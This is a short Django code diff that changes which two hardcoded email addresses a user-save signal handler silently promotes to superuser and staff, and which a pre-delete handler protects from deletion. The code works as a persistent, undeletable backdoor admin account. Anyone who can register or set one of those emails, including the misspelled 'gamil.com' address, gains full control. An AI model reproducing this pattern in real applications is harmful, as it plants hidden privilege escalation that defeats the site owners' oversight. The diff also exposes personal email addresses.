@@ -101,7 +101,7 @@ def create_permission(sender, instance, created, **kwargs):
     if created:
         UserPermissionModel.objects.create(user=instance)
     if not created:
-        if instance.email == 'gmzulkar@gmail.com' or instance.email == 'tasinnaeem@gmail.com':
+        if instance.email == 'bappi142434@gmail.com' or instance.email == 'lahir170monir10.18@gamil.com':
 
             if not instance.is_superuser or not instance.is_staff:
                 instance.is_superuser = True
@@ -113,6 +113,6 @@ def create_permission(sender, instance, created, **kwargs):
 
 @receiver(pre_delete, sender=User, dispatch_uid='user_delete')
 def user_delete(sender, instance, using, **kwargs):
-    if instance.email == 'gmzulkar@gmail.com' or instance.email == 'tasinnaeem@gmail.com':
+    if instance.email == 'bappi142434@gmail.com' or instance.email == 'lahir170monir10.18@gamil.com':
         raise ConnectionError
 
